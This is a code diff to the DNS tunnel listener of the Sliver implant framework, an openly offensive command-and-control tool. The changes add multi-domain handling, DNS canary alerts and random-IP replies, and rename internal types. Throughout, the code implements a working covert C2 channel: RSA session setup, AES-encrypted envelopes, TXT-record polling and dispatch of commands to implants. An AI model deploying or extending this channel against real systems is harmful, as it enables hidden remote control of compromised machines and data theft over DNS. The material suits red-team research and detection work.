@@ -1,6 +1,23 @@
 package c2
 
 /*
+	Sliver Implant Framework
+	Copyright (C) 2019  Bishop Fox
+
+	This program is free software: you can redistribute it and/or modify
+	it under the terms of the GNU General Public License as published by
+	the Free Software Foundation, either version 3 of the License, or
+	(at your option) any later version.
+
+	This program is distributed in the hope that it will be useful,
+	but WITHOUT ANY WARRANTY; without even the implied warranty of
+	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+	GNU General Public License for more details.
+
+	You should have received a copy of the GNU General Public License
+	along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
+	---
 	DNS Tunnel Implementation
 */
 
@@ -8,28 +25,33 @@ import (
 	"crypto/sha256"
 	"crypto/x509"
 	"math"
-	"sliver/server/assets"
+	"net"
 	"sort"
+
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/server/db"
+	"github.com/bishopfox/sliver/server/generate"
 
 	"encoding/base32"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/pem"
 
+	secureRand "crypto/rand"
 	"errors"
 	"fmt"
 	insecureRand "math/rand"
-	pb "sliver/protobuf/sliver"
-	"sliver/server/certs"
-	"sliver/server/core"
-	"sliver/server/cryptography"
-	"sliver/server/log"
 	"strconv"
 	"strings"
 	"sync"
 	"time"
 
-	serverHandlers "sliver/server/handlers"
+	consts "github.com/bishopfox/sliver/client/constants"
+	"github.com/bishopfox/sliver/server/certs"
+	"github.com/bishopfox/sliver/server/core"
+	"github.com/bishopfox/sliver/server/cryptography"
+	serverHandlers "github.com/bishopfox/sliver/server/handlers"
+	"github.com/bishopfox/sliver/server/log"
 
 	"github.com/golang/protobuf/proto"
 	"github.com/miekg/dns"
@@ -53,9 +75,7 @@ const (
 
 var (
 	dnsLog = log.NamedLogger("c2", "dns")
-)
 
-var (
 	dnsCharSet = []rune("abcdefghijklmnopqrstuvwxyz0123456789-_")
 
 	sendBlocksMutex = &sync.RWMutex{}
@@ -79,11 +99,10 @@ type SendBlock struct {
 
 // DNSSession - Holds DNS session information
 type DNSSession struct {
-	ID          string
-	Sliver      *core.Sliver
-	Key         cryptography.AESKey
-	LastCheckin time.Time
-	replay      map[string]bool // Sessions are mutex'd
+	ID      string
+	Session *core.Session
+	Key     cryptography.AESKey
+	replay  map[string]bool // Sessions are mutex 'd
 }
 
 func (s *DNSSession) isReplayAttack(ciphertext []byte) bool {
@@ -103,19 +122,21 @@ func (s *DNSSession) isReplayAttack(ciphertext []byte) bool {
 // --------------------------- DNS SERVER ---------------------------
 
 // StartDNSListener - Start a DNS listener
-func StartDNSListener(domain string) *dns.Server {
-
-	dnsLog.Infof("Starting DNS listener for '%s' ...", domain)
+func StartDNSListener(domains []string, canaries bool) *dns.Server {
+	StartPivotListener()
+	dnsLog.Infof("Starting DNS listener for %v (canaries: %v) ...", domains, canaries)
 
 	dns.HandleFunc(".", func(writer dns.ResponseWriter, req *dns.Msg) {
-		handleDNSRequest(domain, writer, req)
+		req.Question[0].Name = strings.ToLower(req.Question[0].Name)
+		handleDNSRequest(domains, canaries, writer, req)
 	})
 
 	server := &dns.Server{Addr: ":53", Net: "udp"}
 	return server
 }
 
-func handleDNSRequest(domain string, writer dns.ResponseWriter, req *dns.Msg) {
+// DNSRequest -> C2 or canary?
+func handleDNSRequest(domains []string, canaries bool, writer dns.ResponseWriter, req *dns.Msg) {
 	if req == nil {
 		dnsLog.Info("req can not be nil")
 		return
@@ -126,33 +147,107 @@ func handleDNSRequest(domain string, writer dns.ResponseWriter, req *dns.Msg) {
 		return
 	}
 
-	if !dns.IsSubDomain(domain, req.Question[0].Name) {
-		dnsLog.Infof("Ignoring DNS req, '%s' is not a child of '%s'", req.Question[0].Name, domain)
-		return
+	var resp *dns.Msg
+	isC2, domain := isC2SubDomain(domains, req.Question[0].Name)
+	if isC2 {
+		dnsLog.Debugf("'%s' is subdomain of c2 parent '%s'", req.Question[0].Name, domain)
+		resp = handleC2(domain, req)
+	} else if canaries {
+		dnsLog.Debugf("checking '%s' for DNS canary matches", req.Question[0].Name)
+		resp = handleCanary(req)
 	}
+
+	if resp != nil {
+		// dnsLog.Debug(resp.String())
+		writer.WriteMsg(resp)
+	} else {
+		dnsLog.Infof("Invalid query, no DNS response")
+	}
+}
+
+// Returns true if the requested domain is a c2 subdomain, and the domain it matched with
+func isC2SubDomain(domains []string, reqDomain string) (bool, string) {
+	for _, parentDomain := range domains {
+		if dns.IsSubDomain(parentDomain, reqDomain) {
+			dnsLog.Infof("'%s' is subdomain of '%s'", reqDomain, parentDomain)
+			return true, parentDomain
+		}
+	}
+	dnsLog.Infof("'%s' is NOT subdomain of any %v", reqDomain, domains)
+	return false, ""
+}
+
+// C2 -> Record type?
+func handleC2(domain string, req *dns.Msg) *dns.Msg {
 	subdomain := req.Question[0].Name[:len(req.Question[0].Name)-len(domain)]
 	if strings.HasSuffix(subdomain, ".") {
 		subdomain = subdomain[:len(subdomain)-1]
 	}
-	dnsLog.Infof("[dns] processing req for subdomain = %s", subdomain)
-
-	resp := &dns.Msg{}
+	dnsLog.Infof("processing req for subdomain = %s", subdomain)
 	switch req.Question[0].Qtype {
 	case dns.TypeTXT:
-		resp = handleTXT(domain, subdomain, req)
+		return handleTXT(domain, subdomain, req)
+	default:
+	}
+	return nil
+}
+
+// Canary -> valid? -> trigger alert event
+func handleCanary(req *dns.Msg) *dns.Msg {
+
+	reqDomain := strings.ToLower(req.Question[0].Name)
+	if !strings.HasSuffix(reqDomain, ".") {
+		reqDomain += "." // Ensure we have the FQDN
+	}
+
+	canary, err := db.CanaryByDomain(reqDomain)
+	if err != nil {
+		return nil
+	}
+
+	resp := new(dns.Msg)
+	resp.SetReply(req)
+	if canary != nil {
+		dnsLog.Warnf("DNS canary tripped for '%s'", canary.ImplantName)
+		if !canary.Triggered {
+			// Defer publishing the event until we're sure the db is sync'd
+			defer core.EventBroker.Publish(core.Event{
+				Session: &core.Session{
+					Name: canary.ImplantName,
+				},
+				Data:      []byte(canary.Domain),
+				EventType: consts.CanaryEvent,
+			})
+			canary.Triggered = true
+			canary.FirstTrigger = time.Now()
+		}
+		canary.LatestTrigger = time.Now()
+		canary.Count++
+		generate.UpdateCanary(canary)
+	}
+
+	// Respond with random IPs
+	switch req.Question[0].Qtype {
+	case dns.TypeA:
+		resp.Answer = append(resp.Answer, &dns.A{
+			Hdr: dns.RR_Header{Name: req.Question[0].Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 0},
+			A:   randomIP(),
+		})
 	default:
 	}
 
-	writer.WriteMsg(resp)
+	return resp
 }
 
+// handles the c2 TXT record interactions, kind hacky this probably needs to get refactored at some point
 func handleTXT(domain string, subdomain string, req *dns.Msg) *dns.Msg {
 
 	q := req.Question[0]
 	fields := strings.Split(subdomain, ".")
+
 	resp := new(dns.Msg)
 	resp.SetReply(req)
-	msgType := fields[len(fields)-1]
+	msgType := strings.ToLower(fields[len(fields)-1])
 
 	switch msgType {
 
@@ -235,8 +330,6 @@ func handleTXT(domain string, subdomain string, req *dns.Msg) *dns.Msg {
 		dnsLog.Infof("Unknown msg type '%s' in TXT req", fields[len(fields)-1])
 	}
 
-	dnsLog.Debug(resp.String())
-
 	return resp
 }
 
@@ -244,7 +337,7 @@ func handleTXT(domain string, subdomain string, req *dns.Msg) *dns.Msg {
 
 func getFieldMsgType(fields []string) (string, error) {
 	if len(fields) < 1 {
-		return "", errors.New("Invalid number of fields in session init message (nounce)")
+		return "", errors.New("Invalid number of fields in session init message (nonce)")
 	}
 	return fields[len(fields)-1], nil
 }
@@ -262,7 +355,7 @@ func getFieldSessionID(fields []string) (string, error) {
 
 func getFieldNonce(fields []string) (string, error) {
 	if len(fields) < 3 {
-		return "", errors.New("Invalid number of fields in session init message (nounce)")
+		return "", errors.New("Invalid number of fields in session init message (nonce)")
 	}
 	return fields[len(fields)-3], nil
 }
@@ -319,49 +412,51 @@ func startDNSSession(domain string, fields []string) ([]string, error) {
 		return []string{"1"}, err
 	}
 
-	rootDir := assets.GetRootAppDir()
-	publicKeyPEM, privateKeyPEM, err := certs.GetServerRSACertificatePEM(rootDir, "slivers", domain, false)
+	publicKeyPEM, privateKeyPEM, err := certs.GetCertificate(certs.C2ServerCA, certs.RSAKey, domain)
 	if err != nil {
-		dnsLog.Infof("Failed to fetch rsa private key")
+		dnsLog.Infof("Failed to fetch RSA private key")
 		return []string{"1"}, err
 	}
 	publicKeyBlock, _ := pem.Decode([]byte(publicKeyPEM))
 	dnsLog.Infof("RSA Fingerprint: %s", fingerprintSHA256(publicKeyBlock))
 	privateKeyBlock, _ := pem.Decode([]byte(privateKeyPEM))
-	privateKey, _ := x509.ParsePKCS1PrivateKey(privateKeyBlock.Bytes)
+	privateKey, err := x509.ParsePKCS1PrivateKey(privateKeyBlock.Bytes)
+	if err != nil {
+		dnsLog.Infof("Failed to decode RSA private key")
+		return []string{"1"}, err
+	}
 
+	dnsLog.Debugf("Session Init: %v", encryptedSessionInit)
 	sessionInitData, err := cryptography.RSADecrypt(encryptedSessionInit, privateKey)
 	if err != nil {
 		dnsLog.Infof("Failed to decrypt session init msg")
 		return []string{"1"}, err
 	}
 
-	sessionInit := &pb.DNSSessionInit{}
+	sessionInit := &sliverpb.DNSSessionInit{}
 	proto.Unmarshal(sessionInitData, sessionInit)
 
 	dnsLog.Infof("Received new session in request")
 
-	sliver := &core.Sliver{
-		ID:            core.GetHiveID(),
+	session := &core.Session{
+		ID:            core.NextSessionID(),
 		Transport:     "dns",
 		RemoteAddress: "n/a",
-		Send:          make(chan *pb.Envelope, 16),
+		Send:          make(chan *sliverpb.Envelope, 16),
 		RespMutex:     &sync.RWMutex{},
-		Resp:          map[uint64]chan *pb.Envelope{},
+		Resp:          map[uint64]chan *sliverpb.Envelope{},
 	}
-
-	core.Hive.AddSliver(sliver)
+	session.UpdateCheckin()
 
 	aesKey, _ := cryptography.AESKeyFromBytes(sessionInit.Key)
 	sessionID := dnsSessionID()
 	dnsLog.Infof("Starting new DNS session with id = %s", sessionID)
 	dnsSessionsMutex.Lock()
 	(*dnsSessions)[sessionID] = &DNSSession{
-		ID:          sessionID,
-		Sliver:      sliver,
-		Key:         aesKey,
-		LastCheckin: time.Now(),
-		replay:      map[string]bool{},
+		ID:      sessionID,
+		Session: session,
+		Key:     aesKey,
+		replay:  map[string]bool{},
 	}
 	dnsSessionsMutex.Unlock()
 
@@ -416,21 +511,23 @@ func dnsSessionEnvelope(domain string, fields []string) ([]string, error) {
 		if err != nil {
 			return []string{"1"}, errors.New("Failed to decrypt DNS envelope")
 		}
-		envelope := &pb.Envelope{}
+		envelope := &sliverpb.Envelope{}
 		proto.Unmarshal(envelopeData, envelope)
 
 		dnsLog.Infof("Envelope Type = %#v RespID = %#v", envelope.Type, envelope.ID)
 
+		dnsSession.Session.UpdateCheckin()
+
 		// Response Envelope or Handler
-		handlers := serverHandlers.GetSliverHandlers()
+		handlers := serverHandlers.GetSessionHandlers()
 		if envelope.ID != 0 {
-			dnsSession.Sliver.RespMutex.Lock()
-			defer dnsSession.Sliver.RespMutex.Unlock()
-			if resp, ok := dnsSession.Sliver.Resp[envelope.ID]; ok {
+			dnsSession.Session.RespMutex.Lock()
+			defer dnsSession.Session.RespMutex.Unlock()
+			if resp, ok := dnsSession.Session.Resp[envelope.ID]; ok {
 				resp <- envelope
 			}
 		} else if handler, ok := handlers[envelope.Type]; ok {
-			handler.(func(*core.Sliver, []byte))(dnsSession.Sliver, envelope.Data)
+			handler.(func(*core.Session, []byte))(dnsSession.Session, envelope.Data)
 		}
 		return []string{"0"}, nil
 	}
@@ -488,9 +585,16 @@ func dnsSegment(fields []string) ([]string, error) {
 	return []string{"1"}, errors.New("Invalid nonce (session segment)")
 }
 
+// TODO: Avoid double-fetch
 func getDomainKeyFor(domain string) ([]string, error) {
-	rootDir := assets.GetRootAppDir()
-	certPEM, _, _ := certs.GetServerRSACertificatePEM(rootDir, "slivers", domain, false)
+	_, _, err := certs.GetCertificate(certs.C2ServerCA, certs.RSAKey, domain)
+	if err != nil {
+		certs.C2ServerGenerateRSACertificate(domain)
+	}
+	certPEM, _, err := certs.GetCertificate(certs.C2ServerCA, certs.RSAKey, domain)
+	if err != nil {
+		return nil, err
+	}
 	return dnsSendOnce(certPEM)
 }
 
@@ -527,10 +631,10 @@ func dnsSessionPoll(domain string, fields []string) ([]string, error) {
 	dnsSessionsMutex.Unlock()
 
 	isDrained := false
-	envelopes := []*pb.Envelope{}
+	envelopes := []*sliverpb.Envelope{}
 	for !isDrained {
 		select {
-		case envelope := <-dnsSession.Sliver.Send:
+		case envelope := <-dnsSession.Session.Send:
 			dnsLog.Infof("New message from send channel ...")
 			envelopes = append(envelopes, envelope)
 		default:
@@ -540,7 +644,7 @@ func dnsSessionPoll(domain string, fields []string) ([]string, error) {
 
 	if 0 < len(envelopes) {
 		dnsLog.Infof("%d new message(s) for session id %#v", len(envelopes), sessionID)
-		dnsPoll := &pb.DNSPoll{}
+		dnsPoll := &sliverpb.DNSPoll{}
 		for _, envelope := range envelopes {
 			data, err := proto.Marshal(envelope)
 			if err != nil {
@@ -555,7 +659,7 @@ func dnsSessionPoll(domain string, fields []string) ([]string, error) {
 			}
 
 			blockID, size := storeSendBlocks(encryptedEnvelopeData)
-			dnsPoll.Blocks = append(dnsPoll.Blocks, &pb.DNSBlockHeader{
+			dnsPoll.Blocks = append(dnsPoll.Blocks, &sliverpb.DNSBlockHeader{
 				ID:   blockID,
 				Size: uint32(size),
 			})
@@ -663,6 +767,16 @@ func fingerprintSHA256(block *pem.Block) string {
 	return strings.TrimRight(b64hash, "=")
 }
 
+// TODO: Add a geofilter to make it look like we're in various regions of the world.
+// We don't really need to use srand but it's just easier to operate on bytes here.
+func randomIP() net.IP {
+	randBuf := make([]byte, 4)
+	secureRand.Read(randBuf)
+
+	// Ensure non-zeros with various bitmasks
+	return net.IPv4(randBuf[0]|0x10, randBuf[1]|0x10, randBuf[2]|0x1, randBuf[3]|0x10)
+}
+
 // --------------------------- ENCODER ---------------------------
 
 var base32Alphabet = "ab1c2d3e4f5g6h7j8k9m0npqrtuvwxyz"
@@ -673,7 +787,7 @@ func dnsEncodeToString(input []byte) string {
 	return strings.TrimRight(sliverBase32.EncodeToString(input), "=")
 }
 
-// DecodeString decodes the given base32 encodeed bytes
+// DecodeString decodes the given base32 encoded bytes
 func dnsDecodeString(raw string) ([]byte, error) {
 	pad := 8 - (len(raw) % 8)
 	padded := []byte(raw)
